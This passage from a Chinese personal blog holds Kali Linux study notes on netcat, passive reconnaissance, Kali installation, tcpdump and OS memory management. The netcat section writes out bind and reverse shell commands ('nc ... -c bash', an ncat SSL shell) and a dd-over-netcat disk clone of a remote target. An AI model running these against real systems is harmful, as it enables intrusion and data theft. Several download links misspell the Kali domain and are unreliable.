<li>B:<strong><code>🔺命令：nc -nv ip地址 端口号 | tar -xvf -</code></strong>（接收端）</li>
</ul>
</li>
<li>加密传文件（操作系统安装的mcrypt）<ul>
<li>A:<strong><code>🔺命令：nc -lp 端口号 | mcrypt --flush -Fbqd -a rijndael-256 -m ecb &gt; x.mp4</code></strong>（接收端）</li>
<li>B:<strong><code>🔺命令：mcrypt --flush -Fbq -a rijndael-256 -m ecb &lt; x.mp4 | nc -nv ip地址 端口号 -q 1</code></strong>（发送端）</li>
</ul>
</li>
</ul>
<h4 id="6-NC-流媒体服务（需安装mplayer）"><a href="#6-NC-流媒体服务（需安装mplayer）" class="headerlink" title="6. NC-流媒体服务（需安装mplayer）"></a>6. NC-流媒体服务（需安装mplayer）</h4><ul>
<li>A:<strong><code>🔺命令：cat x.mp4 | nc -lp 端口号</code></strong></li>
<li>B:<strong><code>🔺命令：nc -nv ip地址 端口号 | mplayer -vo x11 -cache 3000 -</code></strong></li>
</ul>
<h4 id="7-NC-端口扫描"><a href="#7-NC-端口扫描" class="headerlink" title="7. NC-端口扫描"></a>7. NC-端口扫描</h4><ul>
<li><strong><code>🔺命令：nc -nvz ip地址 x-x(TCP端口号)</code></strong></li>
<li><strong><code>🔺命令：nc -nvzu ip地址 x-x(UDP端口号)</code></strong></li>
</ul>
<h4 id="8-NC-远程克隆硬盘-▲2019-11-25未验证"><a href="#8-NC-远程克隆硬盘-▲2019-11-25未验证" class="headerlink" title="8. NC-远程克隆硬盘 ▲2019.11.25未验证"></a>8. NC-远程克隆硬盘 ▲2019.11.25未验证</h4><ul>
<li>A:<strong><code>🔺命令：nc -lp 端口号 | dd of=/dev/sda</code></strong></li>
<li>B:<strong><code>🔺命令：dd if=/dev/sda | nc -nv IP地址 端口号 -q 1</code></strong></li>
<li>远程电子取证，可以将目标服务器硬盘远程复制，或者内存</li>
</ul>
<blockquote>
<pre><code>硬盘删除文件，只删除文件名的索引，不完整删除文件，进行标记，可以进行恢复
dd进行磁盘复制，是完整的镜像硬盘复制，包括删除的文件标记</code></pre></blockquote>
<h4 id="9-NC-远程控制"><a href="#9-NC-远程控制" class="headerlink" title="9. NC-远程控制"></a>9. NC-远程控制</h4><ul>
<li>正向<ul>
<li>A:<strong><code>🔺命令：nc -lp 端口 -c bash</code></strong></li>
<li>B:<strong><code>🔺命令：nc -nv IP地址 端口号</code></strong></li>
</ul>
</li>
<li>反向<ul>
<li>A:<strong><code>🔺命令：nc -lp 端口号</code></strong></li>
<li>B:<strong><code>🔺命令：nc -nv IP地址 端口号 -c bash</code></strong></li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>Windows用户把bash改成cmd
IDC机房可以采用服务器作为客户端，由内网向外网连接侦听的外部服务器，传递bash</code></pre></blockquote>
<h4 id="10-NC-NCAT（区别于NC，是加密的管道，集成于NMAP）▲2019-11-25需要安装，会覆盖netcat"><a href="#10-NC-NCAT（区别于NC，是加密的管道，集成于NMAP）▲2019-11-25需要安装，会覆盖netcat" class="headerlink" title="10. NC-NCAT（区别于NC，是加密的管道，集成于NMAP）▲2019.11.25需要安装，会覆盖netcat"></a>10. NC-NCAT（区别于NC，是加密的管道，集成于NMAP）▲2019.11.25需要安装，会覆盖netcat</h4><ul>
<li>NC缺乏加密和身份验证的能力（可被嗅探，基本上是透明的，可在外部系统加密再进行传输）</li>
<li>Ncat包含nmap工具包中</li>
<li>A:<strong><code>🔺命令：ncat -c bash --allow IP地址 -vnl 端口号 --ssl</code></strong></li>
<li>B:<strong><code>🔺命令：ncat -nv IP地址 端口 --ssl</code></strong></li>
<li>不同系统/平台的nc参数功能不尽相同</li>
</ul>
<blockquote>
<pre><code>window系统不存在-c参数，需要通过中间文本去传递shell
查询用户手册：🔺命令：man nc（man手册）or 🔺命令：nc -h or 🔺命令：info nc</code></pre></blockquote>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D)%EF%BC%9A%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%BB%8B%E7%BB%8D/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/12/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D)%EF%BC%9A%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%BB%8B%E7%BB%8D/" itemprop="url">Kali Linux笔记(九)：被动信息收集介绍</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-09T19:29:25+08:00">
                2019-12-09
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  259 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  1 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-被动信息收集"><a href="#1-被动信息收集" class="headerlink" title="1. 被动信息收集"></a>1. 被动信息收集</h4><ul>
<li>公开渠道可获得的信息（互联网媒体方式、搜索网站）</li>
<li>与目标系统不产生直接交互（不对目标系统进行大量的探测）</li>
<li>尽量避免留下一切痕迹</li>
<li>OSINT：<ul>
<li>美国军方：<a href="http://www.fas.org/lirp/doddir/army/atp2-229.pdf" target="_blank" rel="noopener">http://www.fas.org/lirp/doddir/army/atp2-229.pdf</a> ▲2019.11.27未找到文件</li>
<li>北大西洋公约组织：<a href="http://information-retrieval.info/docs/NATO-OSINT.html" target="_blank" rel="noopener">http://information-retrieval.info/docs/NATO-OSINT.html</a></li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>Passive reconnaissance(no direct interaction) → 被动侦察
Normal interaction 
Active reconnaissance  → 主动侦察
More infomation greater chance of detection</code></pre></blockquote>
<h4 id="2-信息收集内容"><a href="#2-信息收集内容" class="headerlink" title="2. 信息收集内容"></a>2. 信息收集内容</h4><ul>
<li>IP地址</li>
<li>域名信息</li>
<li>邮件地址（定位邮件服务器，后期社会工程学）</li>
<li>文档图片数据（网络结构，内网交互）</li>
<li>公司地址</li>
<li>公司组织架构</li>
<li>联系电话/传真号码</li>
<li>人员姓名/职务</li>
<li>目标系统使用的技术架构（搜索引擎技术可以发现一部分信息）</li>
<li>公开的商业信息</li>
</ul>
<h4 id="3-信息用途"><a href="#3-信息用途" class="headerlink" title="3. 信息用途"></a>3. 信息用途</h4><ul>
<li>用信息描述目标（重构）</li>
<li>发现（目标主机）</li>
<li>社会工程学攻击</li>
<li>物理缺口</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%8C)%EF%BC%9AKali%20Linux%E5%AE%89%E8%A3%85/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/12/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%8C)%EF%BC%9AKali%20Linux%E5%AE%89%E8%A3%85/" itemprop="url">Kali Linux笔记(二)：Kali Linux安装</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-09T19:29:25+08:00">
                2019-12-09
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  871 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  3 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-硬盘安装"><a href="#1-硬盘安装" class="headerlink" title="1. 硬盘安装"></a>1. 硬盘安装</h4><ul>
<li>下载安装镜像（<a href="http://www.kail.org/Downloads/" target="_blank" rel="noopener">http://www.kail.org/Downloads/</a>  (arm,mini)）</li>
<li>验证hash值（排除文件损失造成的故障，保证文件完整性）</li>
<li>制作启动光盘（live）（推荐UNetbootin启动光盘软件）</li>
<li>制作启动U盘（live-不可安装新软件，live-usb-可安装新软件）</li>
<li>设置BIOS启动顺序</li>
<li>启动安装</li>
</ul>
<h4 id="2-Docker"><a href="#2-Docker" class="headerlink" title="2.Docker"></a>2.Docker</h4><ul>
<li><p>虚拟化和Docker(容器–运行所需要的组件)</p>
</li>
<li><p>Kail Docker image</p>
<p><a href="https://www.kail.org/news/official-kail-linux-docker-images/" target="_blank" rel="noopener">https://www.kail.org/news/official-kail-linux-docker-images/</a></p>
<p><a href="https://github.com/offensive-security/kail-linux-docker" target="_blank" rel="noopener">https://github.com/offensive-security/kail-linux-docker</a></p>
</li>
</ul>
<h4 id="3-虚拟机安装"><a href="#3-虚拟机安装" class="headerlink" title="3.虚拟机安装"></a>3.虚拟机安装</h4><ul>
<li>官方VM镜像<br> <a href="https://www.offensive-security.com/kail-linux-vmware-arm-image-download/" target="_blank" rel="noopener">https://www.offensive-security.com/kail-linux-vmware-arm-image-download/</a></li>
<li>VMware workstation（插件多，文件比较大）</li>
<li>VirtualBox<ul>
<li>下载、安装、扩展工具、基本使用</li>
<li>Win8系统</li>
</ul>
</li>
</ul>
<blockquote>
<p>(卸载kb3045999，通过powershell，get-hotfix-id+固件，wsa /install /bb：+id）</p>
</blockquote>
<ul>
<li>VirtualBox<ul>
<li>安装kail</li>
<li>安装tools</li>
</ul>
</li>
</ul>
<p><strong><code>🔺命令：uname -r 查看linux版本</code></strong></p>
<blockquote>
<p>要安装最新版的linux-heads才能安装vmware-tools，再者可以通过apt-get install</p>
</blockquote>
<h4 id="4-持久加密USB安装"><a href="#4-持久加密USB安装" class="headerlink" title="4. 持久加密USB安装"></a>4. 持久加密USB安装</h4><blockquote>
<p>共享文件夹：/medie/sf_D_Drive（物理主机目录）（2.0版本在/mnt/hfgs下）</p>
</blockquote>
<ul>
<li>LUKS：Linux Unified Key Setup（基于Linux平台开发）<ul>
<li>磁盘分区加密规范</li>
<li>不依赖于操作系统的磁盘级加密</li>
<li>Windows-DoxBox（通过前端后端组件进行加密）</li>
<li>后端：dm-crypt</li>
<li>前端：cryptsetup</li>
<li>微软的bitlocker</li>
</ul>
</li>
<li>将镜像刻录到U盘</li>
</ul>
<blockquote>
<p>1.操作系统的删除文件名，只是删除索引，可通过数据还原技术再恢复</p>
</blockquote>
<blockquote>
<p>(1)文件拷贝：拷贝单个文件到设备</p>
</blockquote>
<blockquote>
<p>(2)块拷贝：将原磁盘每一个扇区存取的每一块数据完全镜像复制到设备（电子取证）</p>
</blockquote>
<ul>
<li><p>将镜像刻录到U盘</p>
<p> <strong><code>🔺命令：dd if=kail-linux-1.1.0-amd64.iso of=/dev/sdb bs=1M</code></strong></p>
<p> if：input file </p>
<p> of：out file bs（复制速度）</p>
<p> dd(以基于块的模式拷贝到块设备，不同基于文件拷贝)</p>
<p> <strong><code>🔺命令：dmesg</code></strong>查看系统操作变化</p>
<ul>
<li>查看插入的u盘所在的位置/sdx</li>
<li>查看U盘原有数据（系统工具-系统管理-Gpatted分区管理器）</li>
<li>卸载分区</li>
<li>删除分区</li>
<li>应用操作</li>
<li>应用dd命令，以块的形式，拷贝到U盘（U盘剩下的空间用于系统加密，若有进行操作，将操作记录在加密部分）</li>
</ul>
<p><strong><code>🔺命令：watch -n 5 killall USR1 dd</code></strong>(汇报工作进展）</p>
</li>
</ul>
<blockquote>
<p>1.Window下的efs加密–文件级别加密，用管理员登陆，可以看到文件加密的信息</p>
</blockquote>
<blockquote>
<p>2.磁盘分区级别的加密，需要密钥，需要证书才可以解出</p>
</blockquote>
<h4 id="5-持久加密USB安装-2"><a href="#5-持久加密USB安装-2" class="headerlink" title="5. 持久加密USB安装-2"></a>5. 持久加密USB安装-2</h4><ul>
<li>为U盘创建额外分区<ul>
<li><strong><code>🔺命令：partx</code></strong>分区工具</li>
<li><strong><code>🔺命令：printf devices</code></strong>列出操作系统挂载的硬盘</li>
<li><strong><code>🔺命令：select /dev/sdx</code></strong>选择要操作的U盘</li>
<li><strong><code>🔺命令：mkpart primary</code></strong>起始位置（上一个分区位置）结束位置（分区大小）</li>
<li><strong><code>🔺命令：quit</code></strong>退出分区工具</li>
</ul>
</li>
<li>使用LUKS加密分区<ul>
<li><strong><code>🔺命令：cryptsetup --verbose --verify-passphrase luksFormat /dev/</code></strong>sdx+分区</li>
<li>输入保护密码</li>
</ul>
</li>
<li>打开加密分区<ul>
<li><strong><code>🔺命令：cryptsetup luksOpen /dev/sdx+分区 usb（可读名称）</code></strong></li>
<li><strong><code>🔺命令：ls /dev/mapper/usb（可读名称）</code></strong></li>
</ul>
</li>
<li>格式化加密分区+卷标<ul>
<li><strong><code>🔺命令：mkfs.ext4（目前最新版本） /dev/mapper/usb（可读名称）</code></strong></li>
<li><strong><code>🔺命令：e2label /dev/mapper/usb（可读名称）persistence（官方指定卷标）</code></strong></li>
</ul>
</li>
<li>挂载加密分区，并创建persistence.conf文件<ul>
<li><strong><code>🔺命令：mkdir -p /mnt/usb</code></strong></li>
<li><strong><code>🔺命令：mount /dev/mapper/usb /mnt/usb/</code></strong></li>
<li><strong><code>🔺命令：echo &quot;/ union&quot; &gt; /mnt/usb/persistence.conf</code></strong></li>
<li><strong><code>🔺命令：umount /dev/mapper/usb</code></strong></li>
<li><strong><code>🔺命令：cryptsetup luksClose /dev/mapper/usb</code></strong></li>
</ul>
</li>
</ul>
<h4 id="6-持久加密USB安装-3"><a href="#6-持久加密USB安装-3" class="headerlink" title="6. 持久加密USB安装-3"></a>6. 持久加密USB安装-3</h4><ul>
<li>Live USB Encrypted Persistence</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB)%EF%BC%9ATCPDUMP/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/12/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB)%EF%BC%9ATCPDUMP/" itemprop="url">Kali Linux笔记(八)：TCPDUMP</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-09T19:29:25+08:00">
                2019-12-09
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  545 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  2 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-TCPDUMP"><a href="#1-TCPDUMP" class="headerlink" title="1. TCPDUMP"></a>1. TCPDUMP</h4><ul>
<li>NO-GUI的抓包分析工具</li>
<li>Linux、Unix系统默认安装</li>
</ul>
<p>v2. TCPDUMP-抓包</p>
<ul>
<li>抓包<ul>
<li>默认只抓每个数据包的68个字节（一般是数据包头）</li>
<li><strong><code>🔺命令：tcpdump -h（--help选项）</code></strong></li>
<li><strong><code>🔺命令：tcpdump -i（网卡） eth0 -s（size） 0 -w（保存） x.pcap</code></strong></li>
<li><strong><code>🔺命令：tcpdump -A（以ASCII码的形式） -r（读取） x.pcap</code></strong></li>
<li><strong><code>🔺命令：tcpdump -X（以十六进制的形式）-r x.pcap</code></strong></li>
<li><strong><code>🔺命令：tcpdump -i eth0 tcp（协议类型） port（端口） x</code></strong></li>
</ul>
</li>
</ul>
<h4 id="3-TCPDUMP-筛选"><a href="#3-TCPDUMP-筛选" class="headerlink" title="3. TCPDUMP-筛选"></a>3. TCPDUMP-筛选</h4><ul>
<li>筛选<ul>
<li><strong><code>🔺命令：tcpdump -n（不做域名解析）-r x.pcap | awk &#39;{print $3} &#39;| sort -u</code></strong></li>
<li><strong><code>🔺命令：tcpdump -n src（源地址） host ip地址 -r x.pcap</code></strong></li>
<li><strong><code>🔺命令：tcpdump -n dst（目标地址） host ip地址 -r x.pcap</code></strong></li>
<li><strong><code>🔺命令：tcpdump -n tcp port x -r x.pcap</code></strong></li>
<li><strong><code>🔺命令：tcpdump -nX（不做域名解析，十六进制形式）tcp port x -r x.pcap</code></strong></li>
</ul>
</li>
</ul>
<h4 id="4-TCPDUMP-高级筛选"><a href="#4-TCPDUMP-高级筛选" class="headerlink" title="4. TCPDUMP-高级筛选"></a>4. TCPDUMP-高级筛选</h4><blockquote>
<pre><code>ACK+PSH数据同时为1，即为数据传输真正开始的位置
ACK为1，确认位 → A
FIN为1，结束位 → F
SYN为1，同步位 → S
PSH为1，推送位 → P
RST为1，复位位 → R
URG为1，紧急位 → U
CWR、ECE（暂未知）
CEUAPRSF 0001100 = 24 in decimal</code></pre></blockquote>
<ul>
<li>高级筛选<ul>
<li><strong><code>🔺命令：tcpdump -A -n &#39;tcp[13]=24&#39;（tcp的第十三字节为ACK+PSH）-r x.pcap</code></strong></li>
</ul>
</li>
</ul>
<h4 id="5-过程文档记录"><a href="#5-过程文档记录" class="headerlink" title="5. 过程文档记录"></a>5. 过程文档记录</h4><ul>
<li>Dradis ▲2019.11.26软件启动失败<ul>
<li>短期临时小团队资源共享</li>
<li>各种插件导入文件</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>Dradis:开启 → http://127.0.0.1:3000 → 只需要输入密码即可 → import from file
导入：namp -p IP地址 -oX x.xml → import from file → upload file
导出：右键 → columns → catagory → HTML Export ready</code></pre></blockquote>
<ul>
<li>Keepnote（层级结构）▲2019.11.26新版本无此软件</li>
</ul>
<blockquote>
<pre><code>Keepnote:开启 → file → notebook 
导出：Export notebook → HTML</code></pre></blockquote>
<ul>
<li>Truecrypt（加密工具）▲2019.11.26新版本无此软件，换为VeraCrypt</li>
</ul>
<blockquote>
<pre><code>生成一个文件夹 → 挂载系统 → 拷贝到文件 → 卸载文件（全盘加密时间很长）
Truecrypt:创建 → create Volume（可文件或者硬盘分区）→  Standard Truecrypt volume（Hidden Truecrypt volume隐藏加密，标准加密打开卷里面什么都没用）→ Select file → Encryption Algorithm（加密算法）+Hash Algorithm（哈希算法）→ Volume size → Volume Password → Format option → Cross-Platform Support（挂载支持）→ Volume Format（鼠标滑动生成随机密码）
Truecrypt:使用 → select file → mount → Dismount All
Hidden Truecrypt volume:存在outer volume和Hidden volume</code></pre></blockquote>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/22/%E7%AC%AC%E4%B8%89%E7%AB%A0%E3%80%81%E5%86%85%E5%AD%98%E6%8A%80%E6%9C%AF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/11/22/%E7%AC%AC%E4%B8%89%E7%AB%A0%E3%80%81%E5%86%85%E5%AD%98%E6%8A%80%E6%9C%AF/" itemprop="url">第三章、内存技术</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-11-22T08:57:15+08:00">
                2019-11-22
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Operating-System-Priciple/" itemprop="url" rel="index">
                    <span itemprop="name">Operating System Priciple</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  2.2k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  7 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="第三章、内存技术"><a href="#第三章、内存技术" class="headerlink" title="第三章、内存技术"></a>第三章、内存技术</h2><hr>
<ol>
<li><p>覆盖技术</p>
<ul>
<li>目标：是在较小的可用内存中运行较大的程序。常用于多道程序系统，与分区存储管理配合使用</li>
<li>原理：把程序按照自身逻辑结构，划分为若干个功能上相对独立的程序模块，那些不会同时执行的模块共享同一块内存区域，按时间先后来运行<ul>
<li>必要部分（常用功能）的代码和数据常驻内存</li>
<li>可选部分（不常用功能）在其他程序模块中实现，平时存放在外存中，在需要用到时才装入内存</li>
<li>不存在调用关系的模块不必同装入到内存，从而可以相互覆盖，即这些模块共用一个分区</li>
</ul>
</li>
<li>缺点<ul>
<li>由程序员来把一个大的程序划分为若干个小的功能模块，并确定各个模块之间的覆盖关系，费时费力，增加了编程的复杂度</li>
<li>覆盖模块从外存装入内存，实际上是以时间延长来换取空间节省</li>
</ul>
</li>
</ul>
</li>
</ol>
<p>2.交换技术</p>
<ul>
<li>目标：多道程序在内存中时，让正在运行的程序或需要运行的程序获得更多的内存资源</li>
<li>方法<ul>
<li>可将暂时不能运行的程序送到外存，从而获得空闲内存空间</li>
<li>操作系统把一个进程的整个地址空间的内存保存到外存中（换出swap out），而将外存中的某个进程的地址空间读入到内存中（换入swap in）。换入换出的内容的大小为整个程序的地址空间</li>
</ul>
</li>
<li>问题<ul>
<li>交换时机的确定：何时需要发生交换？只当内存空间不够或由不够的危险时换出</li>
<li>交换区的大小：必须足够大以存放所有用户进程的所有内存映像的拷贝；必须能对这些内存映像进行直接存取</li>
<li>程序换入时的重定位：换出后再换入内存的位置一定要在原来的位置上吗？最好采用动态地址映射的方法</li>
</ul>
</li>
<li>覆盖与交换的区别<ul>
<li>覆盖只能发生在那些相互之间没有调用关系的程序模块之间，因此程序员必须给出程序内的各个模块之间的逻辑覆盖结构</li>
<li>交换技术是以在内存中的程序大小为单位来进行的，它不需要程序员给出各个模块之间的逻辑覆盖结构。换言之，交换发生在内存中程序与管理程序或操作系统之间，而覆盖则发生在运行程序的内部</li>
</ul>
</li>
</ul>
<ol start="3">
<li><p>虚拟存储技术</p>
<ul>
<li>目标<ul>
<li>像覆盖技术那样，不是把程序的所有内容都放到内存中，因而能够运行比当前的空闲空间还要大的程序。但做得更好，由操作系统自动来完成，无须程序员的干涉</li>
<li>像交换技术那样，能够实现进程在内存与外存之间的交换，因而获得更多的空闲内存空间。但做得更好，只对进程的部分内容在内存和外存之间进行交换</li>
</ul>
</li>
<li>程序的局部性</li>
</ul>
</li>
</ol>
<blockquote>
<pre><code>程序的局部性（principle of locality）：指程序在执行过程中的一个较短时期，所执行的指令地址和指令的操作数地址，分别局限于一定的区域
时间局限性：一条指令的一次执行和下次执行，一个数据的一次访问和下次访问都集中在一个较短时期内
空间局部性：当前指令和邻近的几条指令，当前访问的数据和邻近的几个数据都集中在一个较小区域内</code></pre></blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">程序编写方法1：                        程序编写方法2：</span><br><span class="line">for(j=0;j&lt;1024;j++)                   for(i=0;i&lt;1024;i++)</span><br><span class="line">for(i=0;i&lt;1024;i++)                   for(j=0;j&lt;1024;j++) </span><br><span class="line">     A[i][j]=0;                           A[i][j]=0;</span><br><span class="line">结论：编写方法1在4K一页的内存中，共发生了1024*1024次缺页中断</span><br><span class="line">      编写方法2在4k一页的内存中，共发生了1024次缺页中断</span><br></pre></td></tr></table></figure>

<ul>
<li>基本概念：可以在页式或段式内存管理的基础上实现<ul>
<li>在装入程序时，不必将全部装入到内存，而只需将当前需要执行的部分页面或段装入到内存，就可让程序开始执行</li>
<li>在程序执行过程中，如果需要执行的指令或访问的数据尚未在内存（称位缺页或缺段），则由处理器通知操作系统将相应的页面或段调入到内存，然后继续执行程序</li>
<li>另一方面，操作系统将内存中暂时不使用的页面或段调出保存在外存上，从而腾出更多空闲空间存放将要装入的程序以及将要调入的页面或段</li>
</ul>
</li>
<li>基本特征<ul>
<li>大的用户空间：通过把物理内存与外存相结合，提供给用户的虚拟内存空间通常大于实际的物理内存，即实现了这两者的分离。如32位的虚拟地址理论上可以访问4GB，而可能计算机上仅有的256MB的物理内存，但硬盘容量大于4GB</li>
<li>部分交换：与交换技术相比较，虚拟存储的调入和调出是对部分虚拟地址空间进行的</li>
